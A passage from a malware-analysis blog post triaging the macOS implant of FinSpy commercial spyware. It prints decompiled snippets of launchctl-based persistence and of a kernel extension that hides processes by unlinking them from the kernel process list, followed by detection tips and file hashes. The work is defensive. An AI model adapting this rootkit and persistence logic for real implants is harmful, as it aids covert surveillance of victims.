</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    task <span style="color:#f92672">=</span> [[NSTask alloc] init];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    [task setLaunchPath:<span style="color:#e6db74">@&#34;/bin/launchctl&#34;</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    args <span style="color:#f92672">=</span> [NSArray arrayWithObjects:<span style="color:#e6db74">@&#34;load&#34;</span>, plist, <span style="color:#ae81ff">0x0</span>];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    [r15 setArguments:args];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    [task launch];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    [task waitUntilExit];
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>}</span></span></code></pre></div>
<p>The persistent implant (<code>/private/etc/logind</code>), is now off and running!</p>
<h3 id="rootkit-logindkext">Rootkit (<code>logind.kext</code>)</h3>
<p>One of the (potentially) more interesting aspects of this malware is its kernel-mode rootkit functionality. Simply put, (public) macOS malware with ring-0 capabilities is rare!</p>
<p>The file <code>logind.kext</code> is kernel extension &hellip;albeit unsigned:</p>
<p><div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ codesign -dvv org.logind.ctp.archive/logind.kext/Contents/MacOS/logind 
logind.kext/Contents/MacOS/logind: <b>code object is not signed at all</b>
</pre>
</div>
<br></p>
<div class="note">
<p>As the kernel extension is unsigned, it won&rsquo;t run on any recent version of macOS (which enforce kext code signing requirements).</p>
</div>
<p>It terms of it&rsquo;s functionality, it appears to be a simple process hider.</p>
<center>

</center>
<p>In a function named <code>ph_init</code>, the kernel extension looks up a bunch of kernel symbols (via a function named <code>ksym_resolve_symbol_by_crc32</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ph_init</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    rax <span style="color:#f92672">=</span> ksym_resolve_symbol_by_crc32(<span style="color:#ae81ff">0x127a88e8</span>, rsi, rdx, rcx);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#f92672">*</span>_ALLPROC_ADDRESS <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    rax <span style="color:#f92672">=</span> ksym_resolve_symbol_by_crc32(<span style="color:#ae81ff">0xfffffffffef1d247</span>, rsi, rdx, rcx);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    <span style="color:#f92672">*</span>_LCK_LCK <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>        <span style="color:#f92672">*</span>_LCK_LCK <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    ...
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    rax <span style="color:#f92672">=</span> ksym_resolve_symbol_by_crc32(<span style="color:#ae81ff">0x392ec7ae</span>, rsi, rdx, rcx);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    <span style="color:#f92672">*</span>_LCK_MTX_LOCK <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>        <span style="color:#f92672">*</span>_LCK_MTX_UNLOCK <span style="color:#f92672">=</span> ksym_resolve_symbol_by_crc32(<span style="color:#ae81ff">0x2472817c</span>, rsi, rdx, rcx);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>}</span></span></code></pre></div>
<p>Based on variable names, it appears that <code>logind.kext</code> is attempting to resolve the pointer of the kernel&rsquo;s global list of <code>proc</code> (process) structures, as well as various locks.</p>
<p>In a function named <code>ph_hide</code> the kext will hide a process. This is done by walking the list of <code>proc</code> structures (pointed to by <code>_ALLPROC_ADDRESS</code>), and looking for the one that matches (to hide):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">_ph_hide</span>(<span style="color:#66d9ef">int</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    r14 <span style="color:#f92672">=</span> arg0;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#66d9ef">if</span> (r14 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    r15 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>_ALLPROC_ADDRESS;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    <span style="color:#66d9ef">if</span> (r15 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>SEARCH:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    rax <span style="color:#f92672">=</span> proc_pid(r15);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    rbx <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>r15;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> r14) <span style="color:#66d9ef">goto</span> HIDE;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>loc_15da:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>    r15 <span style="color:#f92672">=</span> rbx;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>    <span style="color:#66d9ef">if</span> (rbx <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> SEARCH;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>HIDE:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>    r14 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(r15 <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>    (<span style="color:#f92672">*</span>_LCK_MTX_LOCK)(<span style="color:#f92672">*</span>_LCK_LCK);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>    <span style="color:#f92672">*</span>r14 <span style="color:#f92672">=</span> rbx;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>    <span style="color:#f92672">*</span>(rbx <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x8</span>) <span style="color:#f92672">=</span> r14;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>    (<span style="color:#f92672">*</span>_LCK_MTX_UNLOCK)(<span style="color:#f92672">*</span>_LCK_LCK);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>    <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>}</span></span></code></pre></div>
<p>In the above code, note that <code>HIDE</code> contains the logic to remove the target process of interest, by unlinking it from the (process) list. Once removed, the process is now (relatively) &ldquo;hidden&rdquo;. (Of course one can leverage XNU level APIs to uncover such process hiding).</p>
<p>The malicious kext also appears to be able to communicate with user-mode via the file <code>/tmp/launchd-935.U3xqZw</code>. Specifically, in a function named <code>ksym_init</code>, it will open and read in the contents of this file (which may contain details of the process to hide?):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ksym_init</span>(<span style="color:#66d9ef">int</span> arg0, <span style="color:#66d9ef">int</span> arg1) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    <span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)_MKI_SIZE <span style="color:#f92672">=</span> fileio_get_file_size(<span style="color:#e6db74">&#34;/tmp/launchd-935.U3xqZw&#34;</span>, arg1);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>    rax <span style="color:#f92672">=</span> _OSMalloc_Tagalloc(<span style="color:#e6db74">&#34;MKI&#34;</span>, <span style="color:#ae81ff">0x0</span>);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>    <span style="color:#f92672">*</span>_MKI_TAG <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> .l1;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>loc_1898:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    rax <span style="color:#f92672">=</span> _OSMalloc(<span style="color:#f92672">*</span>(<span style="color:#66d9ef">int32_t</span> <span style="color:#f92672">*</span>)_MKI_SIZE, rax);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>    <span style="color:#f92672">*</span>_MKI_BUFFER <span style="color:#f92672">=</span> rax;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#66d9ef">if</span> (rax <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> loc_1921;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>loc_18b2:
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>    <span style="color:#66d9ef">if</span> (fileio_read_file_fully(<span style="color:#e6db74">&#34;/tmp/launchd-935.U3xqZw&#34;</span>, rax) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0</span>) <span style="color:#66d9ef">goto</span> loc_1908;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>    ....
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>}</span></span></code></pre></div>
<div class="note">
<p>For more on the topic of Mac rootkits, see:</p>
<center>
  "<a href="http://phrack.org/issues/69/7.html" class="inlineLink">Revisiting Mac OS X Kernel Rootkits</a>"
</center>
</div>
<p>Ok, and what about the malware&rsquo;s C&amp;C comms? capabilities? and more? Well good news, that&rsquo;s already been covered in Amesty&rsquo;s <a href="https://www.amnesty.org/en/latest/research/2020/09/german-made-finspy-spyware-found-in-egypt-and-mac-and-linux-versions-revealed/">writeup</a>.</p>
<p>In terms of C&amp;C communications, the researchers note:</p>
<blockquote>
"The spyware communicates with the Command & Control (C&amp;C) server using HTTP POST requests. The data sent to the server is encrypted using functions provided by the 7F module, compressed using a custom compressor and base64 encoded" 
</blockquote>
<p>Moreover, they uncovered a large list of modules available to the spyware:
<img src="../images/blog/blog_0x4F/capabilities.png"  width="100%" class="center" style="border-radius: 4px;">
</p>
<h3 id="detections">Detections</h3>
<p>We noted our free tools can easily detect FinSpy &hellip;as always, with no a priori knowledge.</p>
<p>Specifically, <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> can detect the malware at runtime, persisting as a launch agent:</p>
<img src="../images/blog/blog_0x4F/blockblock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">BlockBlock&#39;s detection of FinSpy</center>

<p>And if the malware is already present on the system, a <a href="https://objective-see.com/products/knockknock.html">KnockKnock</a> scan can reveal this launch agent as well:</p>
<img src="../images/blog/blog_0x4F/knockknock.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">KnockKnock&#39;s detection of FinSpy</center>

<br>
<div class="note">
You might be wondering, without specific knowledge of OSX.FinSpy, how would one know that the item logind, in KnockKnock's scan is indeed malicious?
<p>By design, KnockKnock simply enumerates persistent items installed on macOS system.
However, the logind item sticks out as it is:</p>
<ul>
<li>unsigned</li>
<li>unrecognized by VirusTotal</li>
</ul>
<p>&hellip;though this does not guarantee such an item is malicious, these observations (in conjunction) are serious red flags, and as such, the item should be closely examined.</p>
</div>
<p>To manually detect (this) variant of of OSX.FinSpy, one could also manually check for the existence of:</p>
<ul>
<li>
<p><code>/private/etc/logind</code>
<br> <code>sha1: 62e5dc40bfabaa712cd9e32ac755384db07f0dab</code></p>
</li>
<li>
<p><code>/Library/LaunchAgents/logind.plist</code>
<br> <code>sha1: a2aba86d5d763f311dff8250bc8fe98de958bff4</code></p>
</li>
<li>
<p><code>logind.kext</code> (likely in <code>/Library/Extensions/</code>)
<br> <code>sha1: 18e1d03e41b5fc6d54fdda340fe2dab219502f3d</code></p>
</li>
</ul>
<h3 id="conclusion">Conclusion</h3>
<p>Today, we triaged FinFisher&rsquo;s macOS implant, FinSpy.</p>
<p>Although rather somewhat dated, it provided an intriguing look into the world of commercial cyber-espionage malware. And yes, the exploits it leveraged were all public (and long patched) and its rootkit capabilities were rather mundane &hellip;but let&rsquo;s not forget that a more modern version of this threat (or similar commercial implant) could be far more sophisticated!</p>
<h3 id="-support-us">üíï Support Us:</h3>
<div style="border: 1px solid #DCDCDC; border-radius:7px; padding: 10px; margin-top:15px; margin-bottom: 15px;">
    <center>Love these blog posts? You can support them via my <a href="https://www.patreon.com/bePatron?c=701171" class="inlineLink">Patreon</a> page!
    <br><br>
    <a href="https://www.patreon.com/bePatron?c=701171" style="text-decoration: none;">
      <img src="../images/patreon.png" style="display:block;margin:auto; padding-top:0px; width:100%"/>
    </a>
    </center>
</div>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            console.log('ok showing!')

            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> ¬ª
        </div>
    </li>

</ul>
</nav>

  </body>
</html>